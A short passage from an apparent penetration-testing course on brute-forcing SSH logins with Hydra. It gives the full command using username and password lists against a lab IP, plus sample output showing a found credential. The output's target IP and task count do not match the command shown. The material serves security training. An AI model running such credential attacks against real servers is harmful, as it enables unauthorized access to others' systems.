#### Hydra - SSH

We can use a tool such as `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing/introduction-to-brute-forcing) module.

  Hydra - SSH

```shell-session
Tachipy@htb[/htb]$ hydra -L ./username.list -P ./password.list ssh://10.129.202.219 -t 64


[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
